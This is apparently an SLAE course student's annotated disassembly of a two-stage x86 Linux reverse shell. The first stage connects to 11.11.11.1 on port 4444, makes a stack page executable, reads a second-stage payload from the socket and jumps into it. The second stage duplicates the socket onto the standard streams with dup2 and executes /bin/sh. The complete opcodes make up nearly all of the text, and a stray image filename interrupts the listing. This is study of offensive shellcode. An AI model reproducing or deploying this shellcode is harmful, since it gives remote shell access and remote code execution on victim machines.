 ; Student ID: SLAE – 871
 ; This is just small part of analysis. Please take a look on the blog to get full explanation

 socket(int domain, int type, int protocol)

00000000  31DB              xor ebx,ebx        ; ebx = zero
00000002  F7E3              mul ebx            ; eax and edx = zero ==> mul EAX by EDX
00000004  53                push ebx        ; push zero on the stack  
00000005  43                inc ebx            ; ebx = 1
00000006  53                push ebx        ; 1 is for SOCK_STREAM
00000007  6A02              push byte +0x2    ; 2 is for AF_INET
00000009  B066              mov al,0x66        ; socketcall
0000000B  89E1              mov ecx,esp        ; pointer
0000000D  CD80              int 0x80        ; Go go!

; as expected, till here the code is exactly the same

; dup2(int oldfd, int newfd)

0000000F  97                xchg eax,edi            ; exchange edi and eax
00000010  5B                pop ebx                ; pop 2 in ebx
00000011  680B0B0B01        push dword 0x10b0b0b    ; push IP 11.11.11.1
00000016  680200115C        push dword 0x5c110002    ; push port 0x5c11 (little endian) = 4444
0000001B  89E1              mov ecx,esp            ; pointer
0000001D  6A66              push byte +0x66        ; push socketcall
0000001F  58                pop eax                ; eax is socketcall
00000020  50                push eax            ; push socketcall
00000021  51                push ecx            ; pointer to sockaddr
00000022  57                push edi            ; from exchange xchg ==> sockfd
00000023  89E1              mov ecx,esp            ; pointer

; Here is the clue, instead of dec ecx (for dup2), we have inc ebx
; EBX was 1 for SOCK_STREAM, then value 2 was popped as EBX, so EBX = 2. After inc = 3
; 3 means CONNECT!

00000025  43                inc ebx                ; ebx =3 ==> connect!
00000026  CD80              int 0x80            ; GO!

; Now it’s the heart of the two staged shell
; memory has to be set as rwx ==> stack is readable writable executable
;

00000028  B207              mov dl,0x7         ; prot_read, prot_write, prot_exec
0000002A  B900100000        mov ecx,0x1000    ; 4096 is the size
0000002F  89E3              mov ebx,esp        ; pointer
00000031  C1EB0C            shr ebx,byte 0xc    ;
00000034  C1E30C            shl ebx,byte 0xc    ; ebx is esp or 0xff000000
00000037  B07D              mov al,0x7d        ; syscall = 125 (mprotect)

dfdfws.png
                            ; int mprotect(void *addr, size_t len, int prot);
00000039  CD80              int 0x80    ; Go!

; From socket on stack

0000003B  5B                pop ebx     ; socket as ebx
0000003C  89E1              mov ecx,esp    ; ecx is stack
0000003E  99                cdq        
0000003F  B60C              mov dh,0xc    ; dx = 192
00000041  B003              mov al,0x3    ; syscall = read (3)
00000043  CD80              int 0x80
00000045  FFE1              jmp ecx        ; go to read bytes ==> execute downloaded code
                            ; the downloaded code must be 2nd stage payload…

////

2nd payload

00000000  89FB              mov ebx,edi        ; ebx is socket

; DUP2

00000002  6A02              push byte +0x2
00000004  59                pop ecx

label:

00000005  6A3F              push byte +0x3f     ; syscall 63 ==> systemcall value for dup2                         ; (which needs to be stored in EAX): 63 = 0x3f hex
00000007  58                pop eax
00000008  CD80              int 0x80
0000000A  49                dec ecx
0000000B  79F8              jns 0x5

; standard execve /bin/sh

0000000D  6A0B              push byte +0xb
0000000F  58                pop eax
00000010  99                cdq
00000011  52                push edx
00000012  682F2F7368        push dword 0x68732f2f
00000017  682F62696E        push dword 0x6e69622f
0000001C  89E3              mov ebx,esp
0000001E  52                push edx
0000001F  53                push ebx
00000020  89E1              mov ecx,esp
00000022  CD80              int 0x80


